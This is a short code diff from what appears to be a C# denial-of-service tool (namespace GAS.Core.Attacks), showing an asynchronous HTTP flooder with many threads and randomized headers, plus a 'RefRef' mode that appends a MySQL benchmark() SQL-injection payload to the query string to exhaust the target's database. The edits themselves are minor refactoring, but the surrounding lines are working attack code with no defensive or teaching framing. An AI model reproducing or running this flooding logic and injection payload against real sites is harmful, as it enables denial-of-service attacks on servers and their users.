@@ -17,13 +17,15 @@ namespace GAS.Core.Attacks {
                 Target = target,
                 Protocol = ProtocolType.Tcp,
                 Randomizer = this.GenerateHeaderBytes,
-                MaxWrite = 1
+                MaxWrite = 1,
+                SendBufferSize = 512,
+                ReadBufferSize = 512
             };
             if ( attackParams.WaitForResponse )
                 info.MaxRead = ulong.MaxValue;
                 
             _flooder = new AsyncFlooder( info, threadCount );
-            this._headers = this.CreateHeaderExpression( attackParams );
+            this._headers = CreateHeaderExpression( attackParams );
             this._exprBuffers = new int[ threadCount ][];
             var c = this._headers.ComputeLengthDataSize();
             for (var i = 0; i < threadCount; i++)
@@ -52,7 +54,7 @@ namespace GAS.Core.Attacks {
                 }
             }
         }
-        private MultiExpression CreateHeaderExpression(HttpAttackParams p) {
+        private static MultiExpression CreateHeaderExpression(HttpAttackParams p) {
             var query = p.Query;
             if ( p.AttackType == HttpAttackType.RefRef)
                 query += "%20and%20(select+benchmark({I:D:999999:999999999},0x{S:H:48:48}))";
